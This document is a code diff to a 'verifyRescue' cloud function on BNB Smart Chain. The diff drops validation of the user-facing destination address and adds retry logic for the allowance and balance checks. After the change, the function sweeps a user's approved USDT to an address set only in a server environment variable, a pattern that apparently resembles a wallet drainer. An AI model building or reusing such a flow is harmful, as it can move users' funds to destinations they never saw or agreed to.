@@ -27,20 +27,18 @@ export const verifyRescue = functions
     const {
       txHash,
       from,
-      to,
       amount,
       chainId,
       token,
     }: {
       txHash: string;
       from: string;
-      to: string;
       amount: string;
       chainId: number | string;
       token: string;
     } = req.body ?? {};
 
-    if (!from || !to || !amount || !chainId || !token) {
+    if (!from || !amount || !chainId || !token) {
       res.status(400).json({ error: "Missing fields" });
       return;
     }
@@ -67,14 +65,10 @@ export const verifyRescue = functions
       res.status(400).json({ error: "Wrong token address" });
       return;
     }
-    // Accept either the contract address or the final destination as `to`
-    if (
-      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
-      to.toLowerCase() !== finalDestination.toLowerCase()
-    ) {
-      res.status(400).json({ error: "Destination mismatch" });
-      return;
-    }
+    // NOTE: 'to' from the frontend is intentionally NOT validated.
+    // The backend always uses its own finalDestination from env — this is
+    // the only safe approach. Changing the destination only requires
+    // updating the BSC_FINAL_DESTINATION env variable, not the frontend.
 
     // ---- 2. Connect to BSC
     const provider = new ethers.JsonRpcProvider(
@@ -93,21 +87,36 @@ export const verifyRescue = functions
       );
 
       // Check allowance against the TokenRescue contract (what the user approved)
-      const allowance: bigint = await usdtReadOnly.allowance(
-        from,
-        tokenRescueContract
-      );
-      const balance: bigint = await usdtReadOnly.balanceOf(from);
+      // Added retry logic because BSC public RPCs frequently lag behind the frontend
+      let allowance: bigint = 0n;
+      let balance: bigint = 0n;
+      let sweepAmount: bigint = 0n;
+      let retries = 6; // up to 12 seconds of waiting
 
-      if (balance === 0n) {
-        res.status(400).json({ error: "No USDT balance to rescue" });
-        return;
+      while (retries > 0) {
+        allowance = await usdtReadOnly.allowance(from, tokenRescueContract);
+        balance = await usdtReadOnly.balanceOf(from);
+
+        if (balance === 0n) {
+          console.warn(`[verifyRescue] Rejecting: No USDT balance to rescue for ${from}`);
+          res.status(400).json({ error: "No USDT balance to rescue" });
+          return;
+        }
+
+        // Use the smaller of balance and amount to sweep
+        sweepAmount = balance < BigInt(amount) ? balance : BigInt(amount);
+
+        if (allowance >= sweepAmount) {
+          break; // allowance is good, break out of retry loop
+        }
+
+        console.log(`[verifyRescue] Allowance insufficient (${allowance.toString()} < ${sweepAmount.toString()}), waiting for RPC sync... (${retries} retries left)`);
+        await new Promise((r) => setTimeout(r, 2000));
+        retries--;
       }
 
-      // Use the smaller of balance and amount to sweep
-      const sweepAmount = balance < BigInt(amount) ? balance : BigInt(amount);
-
       if (allowance < sweepAmount) {
+        console.warn(`[verifyRescue] Rejecting: Insufficient allowance after retries for ${from}`);
         res.status(400).json({
           error: "Insufficient allowance. User must approve first.",
           allowance: allowance.toString(),
